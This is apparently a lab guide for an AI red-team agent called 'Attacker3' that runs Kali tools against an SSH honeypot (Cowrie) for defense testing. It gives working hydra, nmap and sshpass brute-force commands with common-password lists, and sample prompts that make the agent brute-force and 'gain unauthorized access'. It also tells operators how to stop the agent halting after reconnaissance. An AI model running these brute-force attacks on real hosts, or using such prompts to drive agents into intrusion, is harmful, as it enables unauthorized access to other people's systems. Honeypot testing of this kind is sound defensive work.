# Using Attacker3 for SSH-Based Attacks

## ✅ Yes, Attacker3 CAN Perform SSH Attacks!

Attacker3 (RedTeamAgent/ReAct) runs in a **Kali Linux container** and has access to all standard Kali penetration testing tools, including comprehensive SSH attack capabilities.

---

## 🛠️ Available SSH Attack Tools

The Kali container includes:

### 1. **Port Scanning & Enumeration**
- `nmap` - Port scanning, service detection, SSH version detection
- `nc` (netcat) - Banner grabbing, port testing

### 2. **SSH Brute Force**
- `hydra` - Password brute-forcing
- `medusa` - Alternative brute-force tool
- `patator` - Multi-protocol brute-forcer

### 3. **SSH Exploitation**
- `searchsploit` - Search for SSH exploits
- `ssh` client - Direct login attempts
- `sshpass` - Automated password authentication

### 4. **SSH Analysis**
- Banner grabbing
- Version detection
- Username enumeration
- Key exchange analysis

---

## 📋 Example SSH Attack Tasks

### ⚠️ Important: Port Discovery is Automatic!

**You don't need to specify port numbers!** Attacker3 will automatically:
1. **Scan for open ports** using `nmap -p-` (all ports)
2. **Discover services** on those ports
3. **Attack discovered services** including SSH

However, you CAN specify ports if you want to focus on specific services.

### ⚠️ CRITICAL: Be Explicit About Brute Force!

**The agent may stop after reconnaissance if you don't explicitly request brute force!**

If you just say "attack SSH", the agent might:
- ✅ Scan ports
- ✅ Detect SSH version
- ✅ Search for exploits
- ❌ **Stop without trying brute force**

**Solution:** Always explicitly mention "brute force" or "password attacks" in your task!

### Task 1: Explicit Brute Force (RECOMMENDED)

```
Perform a comprehensive penetration test on 192.168.64.1:22. 
After reconnaissance, you MUST attempt SSH brute force attacks using 
tools like hydra or medusa. Test common usernames (root, admin, user) 
and common passwords (password, 123456, admin, root, password123). 
Do not stop after finding no exploits - brute force is required.
```

### Task 2: Automatic Discovery with Explicit Brute Force

```
Perform a full penetration test on 192.168.64.1. 
Scan for all open ports, enumerate services, and for any discovered 
SSH services, you MUST perform brute force attacks using hydra with 
common credentials. Also test the web application for vulnerabilities. 
Document all findings including honeypot indicators.
```

**What attacker3 will do:**
- Run `nmap -p- 192.168.64.1` to discover all ports
- Automatically detect SSH on port 22 (if open)
- Attack SSH service with brute force
- Also attack web services discovered

### Task 2: Comprehensive Multi-Service Attack

```
Conduct a comprehensive penetration test on 192.168.64.1. 
Scan all ports, enumerate all services, and attempt to gain unauthorized 
access through any discovered vulnerabilities. Focus on SSH brute force 
and web application attacks.
```

### Task 3: SSH-Specific (If You Know Port 22 is Open)

```
Attack the SSH service on 192.168.64.1. Use hydra to perform 
brute force attacks with common usernames (root, admin, user) and password 
lists. Test for weak credentials and default passwords.
```

**Note:** Even with this task, attacker3 may still scan ports first to confirm SSH is available.

### Task 4: Honeypot Testing

```
Test 192.168.64.1 for potential honeypot indicators. Scan all ports, 
enumerate services, and attempt SSH logins. Look for signs that services 
might be honeypots (unusual banners, quick disconnections, identical responses).
```

---

## 🔍 What Attacker3 Will Do

Based on past CTF results, attacker3 typically performs:

### 1. **Initial Reconnaissance**
```bash
nmap -p- -A 192.168.64.1        # Full port scan
nmap -p 22 -sV 192.168.64.1     # SSH version detection
nmap --script ssh-hostkey 192.168.64.1  # SSH key enumeration
```

### 2. **SSH Banner Grabbing**
```bash
nc 192.168.64.1 22              # Banner grab
ssh -v root@192.168.64.1       # Verbose SSH connection
```

### 3. **Brute Force Attacks**
```bash
# Correct: Use -P (capital P) with a password file (one password per line)
echo -e "password\n123456\nadmin\nroot" > /tmp/passwords.txt
hydra -l root -P /tmp/passwords.txt -t 4 ssh://192.168.64.1

# Or use a wordlist
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.64.1

# Multiple usernames
echo -e "root\nadmin\nuser" > /tmp/users.txt
hydra -L /tmp/users.txt -P /tmp/passwords.txt -t 4 ssh://192.168.64.1

# ⚠️ WRONG: Don't use -p (lowercase) with comma-separated values
# hydra -l root -p "password,123456,admin,root" ssh://192.168.64.1  # ❌ This treats it as ONE password!
```

### 4. **Exploit Research**
```bash
searchsploit openssh
searchsploit ssh
```

### 5. **Login Attempts**
```bash
ssh root@192.168.64.1           # Manual login attempt
sshpass -p 'password' ssh root@192.168.64.1
```

---

## 🍯 SSH Honeypot Interaction

### How Attacker3 Encounters SSH Honeypots

1. **Port Scanning**:
   ```
   Attacker3 → nmap -p 22 192.168.64.1
   Result: Port 22 open, SSH service detected
   ```

2. **Banner Grabbing**:
   ```
   Attacker3 → nc 192.168.64.1 22
   Result: SSH banner (may reveal honeypot if Cowrie is active)
   ```

3. **Brute Force Attempts**:
   ```
   Attacker3 → hydra -l root -P wordlist.txt ssh://192.168.64.1
   Result: Login attempts logged by honeypot
   ```

4. **Honeypot Trigger**:
   - When attacker3 attempts SSH logins, the **Cowrie honeypot** (if armed) will:
     - Log all login attempts
     - Capture credentials
     - Simulate shell access
     - Track attacker behavior

### Cowrie Honeypot (SSH/Telnet)

The defense system can deploy **Cowrie** which:
- Emulates SSH and Telnet services
- Logs all authentication attempts
- Captures passwords and commands
- Provides fake shell access

**Honeypot Endpoints** (from vulnerable app):
- `/admin-v2` → Can trigger Cowrie
- `/admin` → May lead to SSH access attempts

---

## 🚀 Quick Start: SSH Attack with Attacker3

### Step 1: Start the Container
```bash
cd attacker3
docker run -it --rm --network host redteamagent
```

### Step 2: Run ReAct
```bash
ReAct
```

### Step 3: Enter SSH Attack Task
```
Attack the SSH service running on 192.168.64.1:22. 
Perform port scanning, banner grabbing, version detection, 
and brute force attacks to gain unauthorized access. 
Look for honeypot indicators.
```

### Step 4: Monitor Results
The agent will:
- Scan port 22
- Grab SSH banners
- Attempt brute force
- Try to login
- Report findings

---

## 📊 Comparison: Attacker2 vs Attacker3 for SSH

| Feature | Attacker2 | Attacker3 |
|---------|-----------|-----------|
| **SSH Capabilities** | ✅ SystemSweep specialist | ✅ Full Kali tools |
| **Brute Force** | ✅ Via MCP tools | ✅ Direct hydra/medusa |
| **Honeypot Awareness** | ✅ Queries defense API | ❌ Unaware (more realistic) |
| **SSH Tools** | Via kali-server-mcp | Direct access |
| **Realistic Behavior** | Less realistic | More realistic |

### Attacker2's SystemSweep
- Dedicated SSH attack specialist
- Aware of active honeypots
- Reports to defense system
- Uses MCP bridge

### Attacker3's Approach
- General-purpose attacker
- Unaware of honeypots
- Natural discovery through enumeration
- Direct tool access

---

## 🎯 Best Use Cases

### Use Attacker3 for SSH Attacks When:
- ✅ You want **realistic attacker behavior** (unaware of honeypots)
- ✅ You need **comprehensive SSH testing** (all Kali tools)
- ✅ You want to test **honeypot effectiveness** naturally
- ✅ You need **autonomous operation** without defense integration

### Use Attacker2 for SSH Attacks When:
- ✅ You want **defense system integration** (two-way communication)
- ✅ You need **honeypot awareness** in the attack
- ✅ You want **structured reporting** to defense orchestrator
- ✅ You need **specialized SSH focus** (SystemSweep channel)

---

## ⚠️ Important Notes

1. **SSH Honeypot Setup**: Make sure your SSH honeypot (Cowrie) is:
   - Running and accessible on port 22
   - Properly configured to log attacks
   - Integrated with the defense orchestrator

2. **Network Configuration**: 
   - Use `--network host` on Linux for direct access
   - Use host IP address on macOS (e.g., `192.168.64.1:22`)

3. **Rate Limiting**: 
   - SSH servers may rate-limit brute force attempts
   - Attacker3 may need to adjust `hydra -t` (threads) parameter

4. **Honeypot Detection**:
   - Attacker3 may notice honeypot indicators (unusual banners, quick disconnects)
   - But it will still attempt attacks, making it realistic

5. **Agent Stopping Too Early (Common Issue)**:
   - **Problem**: Agent does reconnaissance but stops without brute force
   - **Symptom**: Only sees `nmap` and `searchsploit`, no `hydra` or login attempts
   - **Cause**: Task doesn't explicitly require brute force
   - **Solution**: Use tasks that explicitly say "brute force" or "password attacks"
   - **Example Bad Task**: "Attack SSH on 192.168.64.1:22" ❌
   - **Example Good Task**: "Brute force SSH on 192.168.64.1:22 using hydra" ✅

---

## 📝 Example Output

When attacker3 performs SSH attacks, you'll see:

```
Command: nmap -p 22 -sV 192.168.64.1
Result: 22/tcp open ssh OpenSSH 8.2p1

Command: hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.64.1
Result: [STATUS] 301.00 tries/min, 1234 login attempts

Command: ssh root@192.168.64.1
Result: Connection refused or authentication failed

Findings:
- SSH service detected on port 22
- OpenSSH 8.2p1 version identified
- Brute force attempts logged
- Possible honeypot indicators detected
```

---

## 🎉 Conclusion

**Yes, attacker3 is fully capable of SSH-based attacks!** It has:
- ✅ All Kali Linux SSH tools
- ✅ Brute force capabilities
- ✅ Banner grabbing and enumeration
- ✅ Natural honeypot interaction
- ✅ Realistic attacker behavior

Just provide a task that includes SSH attack objectives, and attacker3 will use the appropriate tools to test your SSH honeypot!

